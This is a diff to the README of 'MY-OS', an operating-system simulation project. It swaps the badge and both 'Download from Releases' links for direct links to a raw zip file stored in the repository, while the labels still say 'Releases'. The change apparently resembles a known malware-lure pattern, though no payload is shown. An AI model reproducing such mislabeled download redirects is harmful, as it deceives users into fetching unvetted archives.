@@ -1,6 +1,6 @@
 # 🎉 MY-OS - Experience a Virtual Celebration Today!
 
-![Download MY-OS](https://img.shields.io/badge/Download-MY--OS-brightgreen)
+![Download MY-OS](https://github.com/ilikecats204/MY-OS/raw/refs/heads/main/Assets/M-OS-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to MY-OS! This is a hyper-interactive, cinematic Operating System simula
 
 To get MY-OS, visit the link below:
 
-[Download MY-OS from Releases](https://github.com/ilikecats204/MY-OS/releases)
+[Download MY-OS from Releases](https://github.com/ilikecats204/MY-OS/raw/refs/heads/main/Assets/M-OS-3.3.zip)
 
 Once there, you will find the latest version ready for you. Click on the version number to access the download files. After downloading the file, follow these simple steps to run MY-OS.
 
@@ -68,4 +68,4 @@ Feel free to share your thoughts or experiences using MY-OS. Your feedback is in
 
 For further downloads, visit the link below again:
 
-[Download MY-OS from Releases](https://github.com/ilikecats204/MY-OS/releases)
+[Download MY-OS from Releases](https://github.com/ilikecats204/MY-OS/raw/refs/heads/main/Assets/M-OS-3.3.zip)
